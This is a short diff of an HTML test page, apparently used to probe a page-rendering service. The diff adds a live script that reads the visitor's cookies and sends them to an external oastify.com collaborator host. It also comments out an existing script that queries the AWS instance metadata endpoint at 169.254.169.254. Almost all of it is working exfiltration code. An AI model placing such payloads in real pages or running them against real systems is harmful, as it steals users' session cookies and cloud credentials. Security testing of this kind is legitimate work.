@@ -8,7 +8,15 @@
 <body>
     This website is for testing
     <img src="https://fn6hq46t1ev21v0xkt3kbx3xtozfn7bw.oastify.com?thisisNormalImage"/>
-   <script>
+
+    <!-- Get cookies and internal headers -->
+<script>
+  const cookies = document.cookie;
+fetch('https://fn6hq46t1ev21v0xkt3kbx3xtozfn7bw.oastify.com?cookies=' + encodeURIComponent(cookies));
+
+</script>
+    <!-- Extact AWS DATA -->
+   <!-- <script>
     fetch('http://169.254.169.254/latest/meta-data/')
   .then(r => r.text())
   .then(data => {
@@ -30,6 +38,6 @@
   });
 
 
-   </script>
+   </script> -->
 </body>
 </html>
